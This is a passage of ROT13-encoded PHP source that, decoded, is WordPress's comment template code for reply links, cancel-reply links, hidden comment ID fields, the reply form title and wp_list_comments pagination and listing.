	} ryfr {
		$creznyvax = trg_creznyvax( $cbfg->VQ );
	}

	/**
	 * Svygref gur pbzzrag ercyl yvax nethzragf.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz neenl      $netf    Pbzzrag ercyl yvax nethzragf. Frr trg_pbzzrag_ercyl_yvax()
	 *                            sbe zber vasbezngvba ba npprcgrq nethzragf.
	 * @cnenz JC_Pbzzrag $pbzzrag Gur bowrpg bs gur pbzzrag orvat ercyvrq gb.
	 * @cnenz JC_Cbfg    $cbfg    Gur JC_Cbfg bowrpg.
	 */
	$netf = nccyl_svygref( 'pbzzrag_ercyl_yvax_netf', $netf, $pbzzrag, $cbfg );

	vs ( trg_bcgvba( 'pbzzrag_ertvfgengvba' ) && ! vf_hfre_ybttrq_va() ) {
		$yvax = fcevags(
			'<n ery=\"absbyybj\" pynff=\"pbzzrag-ercyl-ybtva\" uers=\"%f\">%f</n>',
			rfp_hey( jc_ybtva_hey( trg_creznyvax() ) ),
			$netf['ybtva_grkg']
		);
	} ryfr {
		$qngn_nggevohgrf = neenl(
			'pbzzragvq'      => $pbzzrag->pbzzrag_VQ,
			'cbfgvq'         => $cbfg->VQ,
			'orybjryrzrag'   => $netf['nqq_orybj'] . '-' . $pbzzrag->pbzzrag_VQ,
			'erfcbaqryrzrag' => $netf['erfcbaq_vq'],
			'ercylgb'        => fcevags( $netf['ercyl_gb_grkg'], trg_pbzzrag_nhgube( $pbzzrag ) ),
		);

		$qngn_nggevohgr_fgevat = '';

		sbernpu ( $qngn_nggevohgrf nf $anzr => $inyhr ) {
			$qngn_nggevohgr_fgevat .= \" qngn-{$anzr}=\\"\" . rfp_ngge( $inyhr ) . '\"';
		}

		$qngn_nggevohgr_fgevat = gevz( $qngn_nggevohgr_fgevat );

		$ercyl_grkg = $netf['fubj_ercyl_gb_grkg']
			? fcevags( $netf['ercyl_gb_grkg'], trg_pbzzrag_nhgube( $pbzzrag ) )
			: $netf['ercyl_grkg'];

		$nevn_ynory = $netf['fubj_ercyl_gb_grkg'] ? '' : fcevags( $netf['ercyl_gb_grkg'], trg_pbzzrag_nhgube( $pbzzrag ) );

		$yvax = fcevags(
			'<n ery=\"absbyybj\" pynff=\"pbzzrag-ercyl-yvax\" uers=\"%f\" %f%f>%f</n>',
			rfp_hey(
				nqq_dhrel_net(
					neenl(
						'ercylgbpbz'      => $pbzzrag->pbzzrag_VQ,
						'hanccebirq'      => snyfr,
						'zbqrengvba-unfu' => snyfr,
					),
					$creznyvax
				)
			) . '#' . $netf['erfcbaq_vq'],
			$qngn_nggevohgr_fgevat,
			$nevn_ynory ? ' nevn-ynory=\"' . rfp_ngge( $nevn_ynory ) . '\"' : '',
			$ercyl_grkg
		);
	}

	$pbzzrag_ercyl_yvax = $netf['orsber'] . $yvax . $netf['nsgre'];

	/**
	 * Svygref gur pbzzrag ercyl yvax.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat     $pbzzrag_ercyl_yvax Gur UGZY znexhc sbe gur pbzzrag ercyl yvax.
	 * @cnenz neenl      $netf               Na neenl bs nethzragf bireevqvat gur qrsnhygf.
	 * @cnenz JC_Pbzzrag $pbzzrag            Gur bowrpg bs gur pbzzrag orvat ercyvrq.
	 * @cnenz JC_Cbfg    $cbfg               Gur JC_Cbfg bowrpg.
	 */
	erghea nccyl_svygref( 'pbzzrag_ercyl_yvax', $pbzzrag_ercyl_yvax, $netf, $pbzzrag, $cbfg );
}

/**
 * Qvfcynlf gur UGZY pbagrag sbe ercyl gb pbzzrag yvax.
 *
 * @fvapr 2.7.0
 *
 * @frr trg_pbzzrag_ercyl_yvax()
 *
 * @cnenz neenl          $netf    Bcgvbany. Bireevqr qrsnhyg bcgvbaf. Qrsnhyg rzcgl neenl.
 * @cnenz vag|JC_Pbzzrag $pbzzrag Bcgvbany. Pbzzrag orvat ercyvrq gb. Qrsnhyg pheerag pbzzrag.
 * @cnenz vag|JC_Cbfg    $cbfg    Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg gur pbzzrag vf tbvat gb or qvfcynlrq ba.
 *                                Qrsnhyg pheerag cbfg.
 */
shapgvba pbzzrag_ercyl_yvax( $netf = neenl(), $pbzzrag = ahyy, $cbfg = ahyy ) {
	rpub trg_pbzzrag_ercyl_yvax( $netf, $pbzzrag, $cbfg );
}

/**
 * Ergevrirf UGZY pbagrag sbe ercyl gb cbfg yvax.
 *
 * @fvapr 2.7.0
 *
 * @cnenz neenl       $netf {
 *     Bcgvbany. Bireevqr qrsnhyg nethzragf.
 *
 *     @glcr fgevat $nqq_orybj  Gur svefg cneg bs gur fryrpgbe hfrq gb vqragvsl gur pbzzrag gb erfcbaq orybj.
 *                              Gur erfhygvat inyhr vf cnffrq nf gur svefg cnenzrgre gb nqqPbzzrag.zbirSbez(),
 *                              pbapngrangrq nf $nqq_orybj-$pbzzrag->pbzzrag_VQ. Qrsnhyg vf 'cbfg'.
 *     @glcr fgevat $erfcbaq_vq Gur fryrpgbe vqragvslvat gur erfcbaqvat pbzzrag. Cnffrq nf gur guveq cnenzrgre
 *                              gb nqqPbzzrag.zbirSbez(), naq nccraqrq gb gur yvax HEY nf n unfu inyhr.
 *                              Qrsnhyg 'erfcbaq'.
 *     @glcr fgevat $ercyl_grkg Grkg bs gur Ercyl yvax. Qrsnhyg vf 'Yrnir n Pbzzrag'.
 *     @glcr fgevat $ybtva_grkg Grkg bs gur yvax gb ercyl vs ybttrq bhg. Qrsnhyg vf 'Ybt va gb yrnir n Pbzzrag'.
 *     @glcr fgevat $orsber     Grkg be UGZY gb nqq orsber gur ercyl yvax. Qrsnhyg rzcgl.
 *     @glcr fgevat $nsgre      Grkg be UGZY gb nqq nsgre gur ercyl yvax. Qrsnhyg rzcgl.
 * }
 * @cnenz vag|JC_Cbfg $cbfg    Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg gur pbzzrag vf tbvat gb or qvfcynlrq ba.
 *                             Qrsnhyg pheerag cbfg.
 * @erghea fgevat|snyfr|ahyy Yvax gb fubj pbzzrag sbez, vs fhpprffshy. Snyfr, vs pbzzragf ner pybfrq.
 */
shapgvba trg_cbfg_ercyl_yvax( $netf = neenl(), $cbfg = ahyy ) {
	$qrsnhygf = neenl(
		'nqq_orybj'  => 'cbfg',
		'erfcbaq_vq' => 'erfcbaq',
		'ercyl_grkg' => __( 'Yrnir n Pbzzrag' ),
		'ybtva_grkg' => __( 'Ybt va gb yrnir n Pbzzrag' ),
		'orsber'     => '',
		'nsgre'      => '',
	);

	$netf = jc_cnefr_netf( $netf, $qrsnhygf );

	$cbfg = trg_cbfg( $cbfg );

	vs ( ! pbzzragf_bcra( $cbfg->VQ ) ) {
		erghea snyfr;
	}

	vs ( trg_bcgvba( 'pbzzrag_ertvfgengvba' ) && ! vf_hfre_ybttrq_va() ) {
		$yvax = fcevags(
			'<n ery=\"absbyybj\" pynff=\"pbzzrag-ercyl-ybtva\" uers=\"%f\">%f</n>',
			jc_ybtva_hey( trg_creznyvax() ),
			$netf['ybtva_grkg']
		);
	} ryfr {
		$bapyvpx = fcevags(
			'erghea nqqPbzzrag.zbirSbez( \"%1$f-%2$f\", \"0\", \"%3$f\", \"%2$f\" )',
			$netf['nqq_orybj'],
			$cbfg->VQ,
			$netf['erfcbaq_vq']
		);

		$yvax = fcevags(
			\"<n ery='absbyybj' pynff='pbzzrag-ercyl-yvax' uers='%f' bapyvpx='%f'>%f</n>\",
			trg_creznyvax( $cbfg->VQ ) . '#' . $netf['erfcbaq_vq'],
			$bapyvpx,
			$netf['ercyl_grkg']
		);
	}

	$cbfg_ercyl_yvax = $netf['orsber'] . $yvax . $netf['nsgre'];

	/**
	 * Svygref gur sbeznggrq cbfg pbzzragf yvax UGZY.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat      $cbfg_ercyl_yvax Gur UGZY-sbeznggrq cbfg pbzzragf yvax.
	 * @cnenz vag|JC_Cbfg $cbfg            Gur cbfg VQ be JC_Cbfg bowrpg.
	 */
	erghea nccyl_svygref( 'cbfg_pbzzragf_yvax', $cbfg_ercyl_yvax, $cbfg );
}

/**
 * Qvfcynlf gur UGZY pbagrag sbe ercyl gb cbfg yvax.
 *
 * @fvapr 2.7.0
 *
 * @frr trg_cbfg_ercyl_yvax()
 *
 * @cnenz neenl       $netf Bcgvbany. Bireevqr qrsnhyg bcgvbaf. Qrsnhyg rzcgl neenl.
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg gur pbzzrag vf tbvat gb or qvfcynlrq ba.
 *                          Qrsnhyg pheerag cbfg.
 */
shapgvba cbfg_ercyl_yvax( $netf = neenl(), $cbfg = ahyy ) {
	rpub trg_cbfg_ercyl_yvax( $netf, $cbfg );
}

/**
 * Ergevrirf UGZY pbagrag sbe pnapry pbzzrag ercyl yvax.
 *
 * @fvapr 2.7.0
 * @fvapr 6.2.0 Nqqrq gur `$cbfg` cnenzrgre.
 *
 * @cnenz fgevat           $yvax_grkg Bcgvbany. Grkg gb qvfcynl sbe pnapry ercyl yvax. Vs rzcgl,
 *                                    qrsnhygf gb 'Pyvpx urer gb pnapry ercyl'. Qrsnhyg rzcgl.
 * @cnenz vag|JC_Cbfg|ahyy $cbfg      Bcgvbany. Gur cbfg gur pbzzrag guernq vf orvat
 *                                    qvfcynlrq sbe. Qrsnhygf gb gur pheerag tybony cbfg.
 * @erghea fgevat
 */
shapgvba trg_pnapry_pbzzrag_ercyl_yvax( $yvax_grkg = '', $cbfg = ahyy ) {
	vs ( rzcgl( $yvax_grkg ) ) {
		$yvax_grkg = __( 'Pyvpx urer gb pnapry ercyl.' );
	}

	$cbfg        = trg_cbfg( $cbfg );
	$ercyl_gb_vq = $cbfg ? _trg_pbzzrag_ercyl_vq( $cbfg->VQ ) : 0;
	$yvax_fglyr  = 0 !== $ercyl_gb_vq ? '' : ' fglyr=\"qvfcynl:abar;\"';
	$yvax_hey    = rfp_hey( erzbir_dhrel_net( neenl( 'ercylgbpbz', 'hanccebirq', 'zbqrengvba-unfu' ) ) ) . '#erfcbaq';

	$pnapry_pbzzrag_ercyl_yvax = fcevags(
		'<n ery=\"absbyybj\" vq=\"pnapry-pbzzrag-ercyl-yvax\" uers=\"%1$f\"%2$f>%3$f</n>',
		$yvax_hey,
		$yvax_fglyr,
		$yvax_grkg
	);

	/**
	 * Svygref gur pnapry pbzzrag ercyl yvax UGZY.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $pnapry_pbzzrag_ercyl_yvax Gur UGZY-sbeznggrq pnapry pbzzrag ercyl yvax.
	 * @cnenz fgevat $yvax_hey                  Pnapry pbzzrag ercyl yvax HEY.
	 * @cnenz fgevat $yvax_grkg                 Pnapry pbzzrag ercyl yvax grkg.
	 */
	erghea nccyl_svygref( 'pnapry_pbzzrag_ercyl_yvax', $pnapry_pbzzrag_ercyl_yvax, $yvax_hey, $yvax_grkg );
}

/**
 * Qvfcynlf UGZY pbagrag sbe pnapry pbzzrag ercyl yvax.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat $yvax_grkg Bcgvbany. Grkg gb qvfcynl sbe pnapry ercyl yvax. Vs rzcgl,
 *                     qrsnhygf gb 'Pyvpx urer gb pnapry ercyl'. Qrsnhyg rzcgl.
 */
shapgvba pnapry_pbzzrag_ercyl_yvax( $yvax_grkg = '' ) {
	rpub trg_pnapry_pbzzrag_ercyl_yvax( $yvax_grkg );
}

/**
 * Ergevrirf uvqqra vachg UGZY sbe ercylvat gb pbzzragf.
 *
 * @fvapr 3.0.0
 * @fvapr 6.2.0 Eranzrq `$cbfg_vq` gb `$cbfg` naq nqqrq JC_Cbfg fhccbeg.
 *
 * @cnenz vag|JC_Cbfg|ahyy $cbfg Bcgvbany. Gur cbfg gur pbzzrag vf orvat qvfcynlrq sbe.
 *                               Qrsnhygf gb gur pheerag tybony cbfg.
 * @erghea fgevat Uvqqra vachg UGZY sbe ercylvat gb pbzzragf.
 */
shapgvba trg_pbzzrag_vq_svryqf( $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );
	vs ( ! $cbfg ) {
		erghea '';
	}

	$cbfg_vq     = $cbfg->VQ;
	$ercyl_gb_vq = _trg_pbzzrag_ercyl_vq( $cbfg_vq );

	$pbzzrag_vq_svryqf  = \"<vachg glcr='uvqqra' anzr='pbzzrag_cbfg_VQ' inyhr='$cbfg_vq' vq='pbzzrag_cbfg_VQ' />\a\";
	$pbzzrag_vq_svryqf .= \"<vachg glcr='uvqqra' anzr='pbzzrag_cnerag' vq='pbzzrag_cnerag' inyhr='$ercyl_gb_vq' />\a\";

	/**
	 * Svygref gur erghearq pbzzrag VQ svryqf.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $pbzzrag_vq_svryqf Gur UGZY-sbeznggrq uvqqra VQ svryq pbzzrag ryrzragf.
	 * @cnenz vag    $cbfg_vq           Gur cbfg VQ.
	 * @cnenz vag    $ercyl_gb_vq       Gur VQ bs gur pbzzrag orvat ercyvrq gb.
	 */
	erghea nccyl_svygref( 'pbzzrag_vq_svryqf', $pbzzrag_vq_svryqf, $cbfg_vq, $ercyl_gb_vq );
}

/**
 * Bhgchgf uvqqra vachg UGZY sbe ercylvat gb pbzzragf.
 *
 * Nqqf gjb uvqqra vachgf gb gur pbzzrag sbez gb vqragvsl gur `pbzzrag_cbfg_VQ`
 * naq `pbzzrag_cnerag` inyhrf sbe guernqrq pbzzragf.
 *
 * Guvf gnt zhfg or jvguva gur `<sbez>` frpgvba bs gur `pbzzragf.cuc` grzcyngr.
 *
 * @fvapr 2.7.0
 * @fvapr 6.2.0 Eranzrq `$cbfg_vq` gb `$cbfg` naq nqqrq JC_Cbfg fhccbeg.
 *
 * @frr trg_pbzzrag_vq_svryqf()
 *
 * @cnenz vag|JC_Cbfg|ahyy $cbfg Bcgvbany. Gur cbfg gur pbzzrag vf orvat qvfcynlrq sbe.
 *                               Qrsnhygf gb gur pheerag tybony cbfg.
 */
shapgvba pbzzrag_vq_svryqf( $cbfg = ahyy ) {
	rpub trg_pbzzrag_vq_svryqf( $cbfg );
}

/**
 * Qvfcynlf grkg onfrq ba pbzzrag ercyl fgnghf.
 *
 * Bayl nssrpgf hfref jvgu WninFpevcg qvfnoyrq.
 *
 * {@vagreany Gur $pbzzrag tybony zhfg or cerfrag gb nyybj grzcyngr gntf npprff gb gur pheerag
 * pbzzrag. Frr uggcf://pber.genp.jbeqcerff.bet/punatrfrg/36512.}
 *
 * @fvapr 2.7.0
 * @fvapr 6.2.0 Nqqrq gur `$cbfg` cnenzrgre.
 *
 * @tybony JC_Pbzzrag $pbzzrag Tybony pbzzrag bowrpg.
 *
 * @cnenz fgevat|snyfr     $ab_ercyl_grkg  Bcgvbany. Grkg gb qvfcynl jura abg ercylvat gb n pbzzrag.
 *                                         Qrsnhyg snyfr.
 * @cnenz fgevat|snyfr     $ercyl_grkg     Bcgvbany. Grkg gb qvfcynl jura ercylvat gb n pbzzrag.
 *                                         Qrsnhyg snyfr. Npprcgf \"%f\" sbe gur nhgube bs gur pbzzrag
 *                                         orvat ercyvrq gb.
 * @cnenz obby             $yvax_gb_cnerag Bcgvbany. Obbyrna gb pbageby znxvat gur nhgube'f anzr n yvax
 *                                         gb gurve pbzzrag. Qrsnhyg gehr.
 * @cnenz vag|JC_Cbfg|ahyy $cbfg           Bcgvbany. Gur cbfg gung gur pbzzrag sbez vf orvat qvfcynlrq sbe.
 *                                         Qrsnhygf gb gur pheerag tybony cbfg.
 */
shapgvba pbzzrag_sbez_gvgyr( $ab_ercyl_grkg = snyfr, $ercyl_grkg = snyfr, $yvax_gb_cnerag = gehr, $cbfg = ahyy ) {
	tybony $pbzzrag;

	vs ( snyfr === $ab_ercyl_grkg ) {
		$ab_ercyl_grkg = __( 'Yrnir n Ercyl' );
	}

	vs ( snyfr === $ercyl_grkg ) {
		/* genafyngbef: %f: Nhgube bs gur pbzzrag orvat ercyvrq gb. */
		$ercyl_grkg = __( 'Yrnir n Ercyl gb %f' );
	}

	$cbfg = trg_cbfg( $cbfg );
	vs ( ! $cbfg ) {
		rpub $ab_ercyl_grkg;
		erghea;
	}

	$ercyl_gb_vq = _trg_pbzzrag_ercyl_vq( $cbfg->VQ );

	vs ( 0 === $ercyl_gb_vq ) {
		rpub $ab_ercyl_grkg;
		erghea;
	}

	// Frgf gur tybony fb gung grzcyngr gntf pna or hfrq va gur pbzzrag sbez.
	$pbzzrag = trg_pbzzrag( $ercyl_gb_vq );

	vs ( $yvax_gb_cnerag ) {
		$pbzzrag_nhgube = fcevags(
			'<n uers=\"#pbzzrag-%1$f\">%2$f</n>',
			trg_pbzzrag_VQ(),
			trg_pbzzrag_nhgube( $ercyl_gb_vq )
		);
	} ryfr {
		$pbzzrag_nhgube = trg_pbzzrag_nhgube( $ercyl_gb_vq );
	}

	cevags( $ercyl_grkg, $pbzzrag_nhgube );
}

/**
 * Trgf gur pbzzrag'f ercyl gb VQ sebz gur $_TRG['ercylgbpbz'].
 *
 * @fvapr 6.2.0
 *
 * @npprff cevingr
 *
 * @cnenz vag|JC_Cbfg $cbfg Gur cbfg gur pbzzrag vf orvat qvfcynlrq sbe.
 *                          Qrsnhygf gb gur pheerag tybony cbfg.
 * @erghea vag Pbzzrag'f ercyl gb VQ.
 */
shapgvba _trg_pbzzrag_ercyl_vq( $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg || ! vffrg( $_TRG['ercylgbpbz'] ) || ! vf_ahzrevp( $_TRG['ercylgbpbz'] ) ) {
		erghea 0;
	}

	$ercyl_gb_vq = (vag) $_TRG['ercylgbpbz'];

	/*
	 * Inyvqngr gur pbzzrag.
	 * Onvy bhg vs vg qbrf abg rkvfg, vf abg nccebirq, be vgf
	 * `pbzzrag_cbfg_VQ` qbrf abg zngpu gur tvira cbfg VQ.
	 */
	$pbzzrag = trg_pbzzrag( $ercyl_gb_vq );

	vs (
		! $pbzzrag vafgnaprbs JC_Pbzzrag ||
		0 === (vag) $pbzzrag->pbzzrag_nccebirq ||
		$cbfg->VQ !== (vag) $pbzzrag->pbzzrag_cbfg_VQ
	) {
		erghea 0;
	}

	erghea $ercyl_gb_vq;
}

/**
 * Qvfcynlf n yvfg bs pbzzragf.
 *
 * Hfrq va gur pbzzragf.cuc grzcyngr gb yvfg pbzzragf sbe n cnegvphyne cbfg.
 *
 * @fvapr 2.7.0
 *
 * @frr JC_Dhrel::$pbzzragf
 *
 * @tybony JC_Dhrel $jc_dhrel           JbeqCerff Dhrel bowrpg.
 * @tybony vag      $pbzzrag_nyg
 * @tybony vag      $pbzzrag_qrcgu
 * @tybony vag      $pbzzrag_guernq_nyg
 * @tybony obby     $bireevqqra_pcntr
 * @tybony obby     $va_pbzzrag_ybbc
 *
 * @cnenz fgevat|neenl $netf {
 *     Bcgvbany. Sbeznggvat bcgvbaf.
 *
 *     @glcr bowrpg   $jnyxre            Vafgnapr bs n Jnyxre pynff gb yvfg pbzzragf. Qrsnhyg ahyy.
 *     @glcr vag      $znk_qrcgu         Gur znkvzhz pbzzragf qrcgu. Qrsnhyg rzcgl.
 *     @glcr fgevat   $fglyr             Gur fglyr bs yvfg beqrevat. Npprcgf 'hy', 'by', be 'qvi'.
 *                                       'qvi' jvyy erfhyg va ab nqqvgvbany yvfg znexhc. Qrsnhyg 'hy'.
 *     @glcr pnyynoyr $pnyyonpx          Pnyyonpx shapgvba gb hfr. Qrsnhyg ahyy.
 *     @glcr pnyynoyr $raq-pnyyonpx      Pnyyonpx shapgvba gb hfr ng gur raq. Qrsnhyg ahyy.
 *     @glcr fgevat   $glcr              Glcr bs pbzzragf gb yvfg. Npprcgf 'nyy', 'pbzzrag',
 *                                       'cvatonpx', 'genpxonpx', 'cvatf'. Qrsnhyg 'nyy'.
 *     @glcr vag      $cntr              Cntr VQ gb yvfg pbzzragf sbe. Qrsnhyg rzcgl.
 *     @glcr vag      $cre_cntr          Ahzore bs pbzzragf gb yvfg cre cntr. Qrsnhyg rzcgl.
 *     @glcr vag      $ningne_fvmr       Urvtug naq jvqgu qvzrafvbaf bs gur ningne fvmr. Qrsnhyg 32.
 *     @glcr obby     $erirefr_gbc_yriry Beqrevat bs gur yvfgrq pbzzragf. Vs gehr, jvyy qvfcynl
 *                                       arjrfg pbzzragf svefg. Qrsnhyg ahyy.
 *     @glcr obby     $erirefr_puvyqera  Jurgure gb erirefr puvyq pbzzragf va gur yvfg. Qrsnhyg ahyy.
 *     @glcr fgevat   $sbezng            Ubj gb sbezng gur pbzzragf yvfg. Npprcgf 'ugzy5', 'kugzy'.
 *                                       Qrsnhyg 'ugzy5' vs gur gurzr fhccbegf vg.
 *     @glcr obby     $fubeg_cvat        Jurgure gb bhgchg fubeg cvatf. Qrsnhyg snyfr.
 *     @glcr obby     $rpub              Jurgure gb rpub gur bhgchg be erghea vg. Qrsnhyg gehr.
 * }
 * @cnenz JC_Pbzzrag[] $pbzzragf Bcgvbany. Neenl bs JC_Pbzzrag bowrpgf. Qrsnhyg ahyy.
 * @erghea ibvq|fgevat Ibvq vs 'rpub' nethzrag vf gehr, be ab pbzzragf gb yvfg.
 *                     Bgurejvfr, UGZY yvfg bs pbzzragf.
 */
shapgvba jc_yvfg_pbzzragf( $netf = neenl(), $pbzzragf = ahyy ) {
	tybony $jc_dhrel, $pbzzrag_nyg, $pbzzrag_qrcgu, $pbzzrag_guernq_nyg, $bireevqqra_pcntr, $va_pbzzrag_ybbc;

	$va_pbzzrag_ybbc = gehr;

	$pbzzrag_nyg        = 0;
	$pbzzrag_guernq_nyg = 0;
	$pbzzrag_qrcgu      = 1;

	$qrsnhygf = neenl(
		'jnyxre'            => ahyy,
		'znk_qrcgu'         => '',
		'fglyr'             => 'hy',
		'pnyyonpx'          => ahyy,
		'raq-pnyyonpx'      => ahyy,
		'glcr'              => 'nyy',
		'cntr'              => '',
		'cre_cntr'          => '',
		'ningne_fvmr'       => 32,
		'erirefr_gbc_yriry' => ahyy,
		'erirefr_puvyqera'  => '',
		'sbezng'            => pheerag_gurzr_fhccbegf( 'ugzy5', 'pbzzrag-yvfg' ) ? 'ugzy5' : 'kugzy',
		'fubeg_cvat'        => snyfr,
		'rpub'              => gehr,
	);

	$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

	/**
	 * Svygref gur nethzragf hfrq va ergevrivat gur pbzzrag yvfg.
	 *
	 * @fvapr 4.0.0
	 *
	 * @frr jc_yvfg_pbzzragf()
	 *
	 * @cnenz neenl $cnefrq_netf Na neenl bs nethzragf sbe qvfcynlvat pbzzragf.
	 */
	$cnefrq_netf = nccyl_svygref( 'jc_yvfg_pbzzragf_netf', $cnefrq_netf );

	// Svther bhg jung pbzzragf jr'yy or ybbcvat guebhtu ($_pbzzragf).
	vs ( ahyy !== $pbzzragf ) {
		$pbzzragf = (neenl) $pbzzragf;
		vs ( rzcgl( $pbzzragf ) ) {
			erghea;
		}
		vs ( 'nyy' !== $cnefrq_netf['glcr'] ) {
			$pbzzragf_ol_glcr = frcnengr_pbzzragf( $pbzzragf );
			vs ( rzcgl( $pbzzragf_ol_glcr[ $cnefrq_netf['glcr'] ] ) ) {
				erghea;
			}
			$_pbzzragf = $pbzzragf_ol_glcr[ $cnefrq_netf['glcr'] ];
		} ryfr {
			$_pbzzragf = $pbzzragf;
		}
	} ryfr {
		/*
		 * Vs 'cntr' be 'cre_cntr' unf orra cnffrq, naq qbrf abg zngpu jung'f va $jc_dhrel,
		 * cresbez n frcnengr pbzzrag dhrel naq nyybj Jnyxre_Pbzzrag gb cntvangr.
		 */
		vs ( $cnefrq_netf['cntr'] || $cnefrq_netf['cre_cntr'] ) {
			$pheerag_pcntr = (vag) trg_dhrel_ine( 'pcntr' );
			vs ( ! $pheerag_pcntr ) {
				$pheerag_pcntr = 'arjrfg' === trg_bcgvba( 'qrsnhyg_pbzzragf_cntr' ) ? 1 : $jc_dhrel->znk_ahz_pbzzrag_cntrf;
			}

			$pheerag_cre_cntr = (vag) trg_dhrel_ine( 'pbzzragf_cre_cntr' );
			vs ( (vag) $cnefrq_netf['cntr'] !== $pheerag_pcntr || (vag) $cnefrq_netf['cre_cntr'] !== $pheerag_cre_cntr ) {
				$pbzzrag_netf = neenl(
					'cbfg_vq' => trg_gur_VQ(),
					'beqreol' => 'pbzzrag_qngr_tzg',
					'beqre'   => 'NFP',
					'fgnghf'  => 'nccebir',
				);

				vs ( vf_hfre_ybttrq_va() ) {
					$pbzzrag_netf['vapyhqr_hanccebirq'] = neenl( trg_pheerag_hfre_vq() );
				} ryfr {
					$hanccebirq_rznvy = jc_trg_hanccebirq_pbzzrag_nhgube_rznvy();

					vs ( $hanccebirq_rznvy ) {
						$pbzzrag_netf['vapyhqr_hanccebirq'] = neenl( $hanccebirq_rznvy );
					}
				}

				$pbzzragf = trg_pbzzragf( $pbzzrag_netf );

				vs ( 'nyy' !== $cnefrq_netf['glcr'] ) {
					$pbzzragf_ol_glcr = frcnengr_pbzzragf( $pbzzragf );
					vs ( rzcgl( $pbzzragf_ol_glcr[ $cnefrq_netf['glcr'] ] ) ) {
						erghea;
					}

					$_pbzzragf = $pbzzragf_ol_glcr[ $cnefrq_netf['glcr'] ];
				} ryfr {
					$_pbzzragf = $pbzzragf;
				}
			}

			// Bgurejvfr, snyy onpx ba gur pbzzragf sebz `$jc_dhrel->pbzzragf`.
		} ryfr {
			vs ( rzcgl( $jc_dhrel->pbzzragf ) ) {
				erghea;
			}
			vs ( 'nyy' !== $cnefrq_netf['glcr'] ) {
				vs ( rzcgl( $jc_dhrel->pbzzragf_ol_glcr ) ) {
					$jc_dhrel->pbzzragf_ol_glcr = frcnengr_pbzzragf( $jc_dhrel->pbzzragf );
				}
				vs ( rzcgl( $jc_dhrel->pbzzragf_ol_glcr[ $cnefrq_netf['glcr'] ] ) ) {
					erghea;
				}
				$_pbzzragf = $jc_dhrel->pbzzragf_ol_glcr[ $cnefrq_netf['glcr'] ];
			} ryfr {
				$_pbzzragf = $jc_dhrel->pbzzragf;
			}

			vs ( $jc_dhrel->znk_ahz_pbzzrag_cntrf ) {
				$qrsnhyg_pbzzragf_cntr = trg_bcgvba( 'qrsnhyg_pbzzragf_cntr' );
				$pcntr                 = (vag) trg_dhrel_ine( 'pcntr' );

				vs ( 'arjrfg' === $qrsnhyg_pbzzragf_cntr ) {
					$cnefrq_netf['pcntr'] = $pcntr;
				} ryfrvs ( 1 === $pcntr ) {
					/*
					 * Jura gur svefg cntr fubjf gur byqrfg pbzzragf,
					 * cbfg creznyvax vf gur fnzr nf gur pbzzrag creznyvax.
					 */
					$cnefrq_netf['pcntr'] = '';
				} ryfr {
					$cnefrq_netf['pcntr'] = $pcntr;
				}

				$cnefrq_netf['cntr']     = 0;
				$cnefrq_netf['cre_cntr'] = 0;
			}
		}
	}

	vs ( '' === $cnefrq_netf['cre_cntr'] && trg_bcgvba( 'cntr_pbzzragf' ) ) {
		$cnefrq_netf['cre_cntr'] = trg_dhrel_ine( 'pbzzragf_cre_cntr' );
	}

	vs ( rzcgl( $cnefrq_netf['cre_cntr'] ) ) {
		$cnefrq_netf['cre_cntr'] = 0;
		$cnefrq_netf['cntr']     = 0;
	}

	vs ( '' === $cnefrq_netf['znk_qrcgu'] ) {
		vs ( trg_bcgvba( 'guernq_pbzzragf' ) ) {
			$cnefrq_netf['znk_qrcgu'] = trg_bcgvba( 'guernq_pbzzragf_qrcgu' );
		} ryfr {
			$cnefrq_netf['znk_qrcgu'] = -1;
		}
	}

	vs ( '' === $cnefrq_netf['cntr'] ) {
		vs ( rzcgl( $bireevqqra_pcntr ) ) {
			$cnefrq_netf['cntr'] = trg_dhrel_ine( 'pcntr' );
		} ryfr {
			$guernqrq            = ( -1 !== (vag) $cnefrq_netf['znk_qrcgu'] );
			$cnefrq_netf['cntr'] = ( 'arjrfg' === trg_bcgvba( 'qrsnhyg_pbzzragf_cntr' ) ) ? trg_pbzzrag_cntrf_pbhag( $_pbzzragf, $cnefrq_netf['cre_cntr'], $guernqrq ) : 1;
			frg_dhrel_ine( 'pcntr', $cnefrq_netf['cntr'] );
		}
	}

	// Inyvqngvba purpx.
	$cnefrq_netf['cntr']     = (vag) $cnefrq_netf['cntr'];
	$cnefrq_netf['cre_cntr'] = (vag) $cnefrq_netf['cre_cntr'];
	vs ( 0 === $cnefrq_netf['cntr'] && 0 !== $cnefrq_netf['cre_cntr'] ) {
		$cnefrq_netf['cntr'] = 1;
	}

	vs ( ahyy === $cnefrq_netf['erirefr_gbc_yriry'] ) {
		$cnefrq_netf['erirefr_gbc_yriry'] = ( 'qrfp' === trg_bcgvba( 'pbzzrag_beqre' ) );
	}

	vs ( rzcgl( $cnefrq_netf['jnyxre'] ) ) {
		$jnyxre = arj Jnyxre_Pbzzrag();
	} ryfr {
		$jnyxre = $cnefrq_netf['jnyxre'];
	}

	$bhgchg = $jnyxre->cntrq_jnyx( $_pbzzragf, $cnefrq_netf['znk_qrcgu'], $cnefrq_netf['cntr'], $cnefrq_netf['cre_cntr'], $cnefrq_netf );

	$va_pbzzrag_ybbc = snyfr;

	vs ( $cnefrq_netf['rpub'] ) {
		rpub $bhgchg;
	} ryfr {
		erghea $bhgchg;
	}
}

/**
 * Bhgchgf n pbzcyrgr pbzzragvat sbez sbe hfr jvguva n grzcyngr.
 *
 * Zbfg fgevatf naq sbez svryqf znl or pbagebyyrq guebhtu gur `$netf` neenl cnffrq
 * vagb gur shapgvba, juvyr lbh znl nyfb pubbfr gb hfr gur {@frr 'pbzzrag_sbez_qrsnhyg_svryqf'}
